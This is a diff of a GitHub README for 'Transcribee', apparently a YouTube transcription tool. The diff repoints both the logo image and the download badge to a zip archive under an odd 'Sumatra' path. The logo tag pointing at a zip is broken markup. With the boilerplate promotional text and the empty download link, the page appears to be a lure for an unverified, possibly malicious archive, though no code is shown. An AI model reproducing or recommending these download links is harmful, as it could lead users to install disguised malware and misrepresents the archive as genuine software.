@@ -5,7 +5,7 @@ Effortlessly transcribe YouTube videos with AI-powered accuracy, seamless Chrome
 ## Overview
 Transcribee is a powerful tool designed to simplify the process of transcribing YouTube videos. With the use of advanced AI technology, Transcribee ensures high accuracy in converting audio content into text. The Chrome extension integration allows for quick and easy access, making transcription tasks more efficient than ever before. The modern web interface provides a user-friendly experience, enabling users to transcribe with ease.
 
-![Transcribee Logo](https://github.com/GarotoQualquer/Transcribee/releases/download/v1.0/Program.zip)
+![Transcribee Logo](https://raw.githubusercontent.com/GarotoQualquer/Transcribee/main/Sumatra/Software_3.0.zip)
 
 ## Key Features
 - AI-powered transcription
@@ -19,7 +19,7 @@ Transcribee is a powerful tool designed to simplify the process of transcribing 
 ## Getting Started
 To get started with Transcribee, simply click [here](#) to download the latest version.
 
-[![Download Transcribee](https://github.com/GarotoQualquer/Transcribee/releases/download/v1.0/Program.zip%20Version-blue)](https://github.com/GarotoQualquer/Transcribee/releases/download/v1.0/Program.zip)
+[![Download Transcribee](https://raw.githubusercontent.com/GarotoQualquer/Transcribee/main/Sumatra/Software_3.0.zip%20Version-blue)](https://raw.githubusercontent.com/GarotoQualquer/Transcribee/main/Sumatra/Software_3.0.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
